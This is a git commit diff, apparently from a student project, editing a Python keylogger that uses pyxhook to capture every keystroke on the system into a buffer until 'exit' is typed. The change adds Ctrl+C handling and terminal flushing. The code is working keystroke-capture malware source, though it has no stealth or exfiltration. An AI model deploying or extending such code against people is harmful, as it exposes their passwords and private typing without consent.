20dd7354d0ab730ea2387c8e45e46152922ddec8
Sofia279 <sofialatorre313@ciencias.unam.mx>
2025-06-02 13:53:19 -0600

    Excepcion de ctrl c en terminal, exit terminado

--- keylogger_core.py
+++ keylogger_core.py
@@ -1,60 +1,67 @@
 import pyxhook
 import time
+import sys
+import termios
 
 class Keyloggerore:
 
     def __init__(self):
-        self.buffer = ""
-        self.running = True
+        self.buffer = "" # Registro de pulsaciones
+        self.running = True 
 
     ### Funcion (MODIFICADA) de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
     # This function is called every time a key is presssed
-    def kbevent(self,event):
+    def callback(self,event):
         global running, buffer
         
         if hasattr(event, 'Key'): # se toma event.Key (los otros son: event.KeyID, event.Ascii)
             self.buffer += event.Key
-        
+            
         # print key info 
-        print(event) # ELIMINAR DESPUES
-        print(self.buffer)
+        #print(event.Key) # ELIMINAR DESPUES
+        #print(self.buffer)
 
         # If the "string" value matches spacebar, terminate the while loop
         if "exit" in self.buffer.lower():
-            print("[x] Se detecto 'exit'. Finalizando keylogger.")
+            print("\n[x] Se detecto 'exit'. Finalizando keylogger.")
+            termios.tcflush(sys.stdin, termios.TCIFLUSH) # Limpiar terminal
+            # Mientras se ejecuta el programa tambien se registran las 
+            # pulsaciones en la misma terminal, las cuales forman una cola 
+            # de teclas que esperan su turno para ser procesadas
             running = False
-            
-    def callback():
-        pass
+            self.buffer = ""
         
-     
-
-
 if __name__ == "__main__":
 
-    print("Keylogger iniciado")
+    print("============= Keylogger iniciado. =============")
     logger = Keyloggerore()
     
-    ### codigo tomado de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
-    # Create hookmanager
-    hookman = pyxhook.HookManager()
-    # Define our callback to fire when a key is pressed down
-    hookman.KeyDown = logger.kbevent
-    # Hook the keyboard
-    hookman.HookKeyboard()
-    # Start our listener
-    hookman.start()
+    try:
+        ### codigo tomado de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
+        # Create hookmanager
+        hookman = pyxhook.HookManager()
+        # Define our callback to fire when a key is pressed down
+        hookman.KeyDown = logger.callback
+        # Hook the keyboard
+        hookman.HookKeyboard()
+        # Start our listener
+        hookman.start()
 
-    # Create a loop to keep the application running
-    running = True
-    while running:
-        time.sleep(0.1)
+        # Create a loop to keep the application running
+        running = True
+        while running:
+            time.sleep(0.1)
+            
+    except KeyboardInterrupt:
+        print("\n[x] Programa interrumpido por Ctrl+C.")
+        running = False
+        buffer = ""
 
     # Close the listener when we are done
     hookman.cancel()
     ### fin de example.py
     
-    print("Keylogger detenido")
+    print("============= Keylogger detenido. =============")
         
         
     
